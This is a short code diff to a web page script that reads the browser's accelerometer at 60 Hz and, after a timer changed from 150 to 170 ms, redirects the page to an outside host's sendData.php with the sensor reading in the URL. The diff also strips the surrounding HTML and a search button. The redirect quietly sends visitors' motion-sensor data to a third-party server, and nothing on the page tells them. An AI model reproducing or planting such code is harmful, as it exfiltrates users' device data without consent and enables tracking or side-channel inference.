@@ -1,9 +1,4 @@
-<html>
-<head></head>
-<body>
-    <input type="button" id="btn" value="Search" onclick="doSomething();"/>
     <script>
-       let elem = document.getElementById('btn');
        let value = null;
        let acl = new Accelerometer({frequency: 60});
         
@@ -15,7 +10,5 @@
     function redir() {
   document.location.replace("http://medved3q.beget.tech/sendData.php?x="+value);
 }
-    setTimeout(redir, 150);
+    setTimeout(redir, 170);
     </script>
-</body>
-</html>  
